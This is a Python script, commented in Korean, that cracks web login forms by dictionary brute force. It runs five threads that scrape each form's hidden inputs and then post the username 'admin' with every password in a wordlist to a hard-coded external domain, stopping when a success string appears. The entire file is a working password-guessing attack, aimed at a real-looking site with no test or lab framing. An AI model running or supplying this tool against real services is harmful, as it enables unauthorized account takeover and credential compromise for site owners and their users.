# import modules
# build_opener: 지정된 URL에 대한 요청 처리
# HTTPCookieProcessor: 쿠키 정보를 build_opener의 쿠키 저장소에 설정
# http.cookiejar: 쿠키 처리를 위한 다양한 메소드를 제공하는 모듈
# HTMLParser: HTML 소스코드를 파싱하기 위한 다양한 메소드 제공
# urlencode: 입력된 인자를 HTTP의 쿼리 문자열로 인코딩

from urllib.request import build_opener, HTTPCookieProcessor
import http.cookiejar as cookielib
from html.parser import HTMLParser
from urllib.parse import urlencode
from queue import Queue
from threading import Thread

num_threads = 5     # 스레드 구동 개수
wordlist = 'dictionary.txt'     # 패스워드 무차별 공격을 위한 사전 파일

targeturl = 'http://api.blockchain-tracker.site/login.js'   # 로그인 페이지
targetpost = 'http://api.blockchain-tracker.site/login.js'  # 로그인 처리 코드

username_field = 'id'   # 로그인 input 태그의 사용자 아이디 입력부 이름
pass_field = 'pwd'  # 로그인 input 태그의 패스워드 입력부 이름
check = 'update'    # 로그인 성공 여부를 판단하는 문자열
isCorrect = False   # 크래킹 성공 시 스레드 중지를 위한 플래그

class myHTMLParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tagResult = {}
        
    # HTML 태그에서 오프닝 태그를 만났을 때 호출되는 함수
    # input 태그를 찾아서 'name=', 'value=' 속성 값을 찾아 self.tagResult 사전 자료에 저장한다.
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            tagname = None
            tagvalue = None
            for name, value in attrs:
                if name == 'name':
                    tagname = value
                if name == 'value':
                    tagvalue = value
            if tagname is not None:
                self.tagResult[tagname] = tagvalue

# 큐 객체와 사용자 이름을 전달받아 웹 인증 크래킹 수행
def webAuthCracker(q, username):
    global isCorrect
    while not q.empty() and not isCorrect:
        password = q.get().rstrip()
        cookies = cookielib.FileCookieJar('cookies')
        opener = build_opener(HTTPCookieProcessor(cookies))
        res = opener.open(targeturl)
        htmlpage = res.read().decode()
        print('+++TRYING {}: {}'.format(username, password))
        parser = myHTMLParser()
        parser.feed(htmlpage)
        inputtags = parser.tagResult
        inputtags[username_field] = username
        inputtags[pass_field] = password

        loginData = urlencode(inputtags).encode('utf-8')
        loginRes = opener.open(targetpost, data=loginData)
        loginResult = loginRes.read().decode()

        if check in loginResult:
            isCorrect = True
            print('---CRACKING SUCCESS!')
            print('---Username[{}] Password[{}]'.format(username, password))
            print('---Waiting Other Threads Terminated..')

def main():
    username = 'admin'
    q = Queue()
    with open(wordlist, 'rt') as f:
        words = f.readlines()

    for word in words:
        word = word.rstrip()
        q.put(word)

    print('+++[{}] CRACKING WEB AUTH START..'.format(username))
    for i in range(num_threads):
        t = Thread(target=webAuthCracker, args=(q, username))
        t.start()

if __name__ == "__main__":
    main()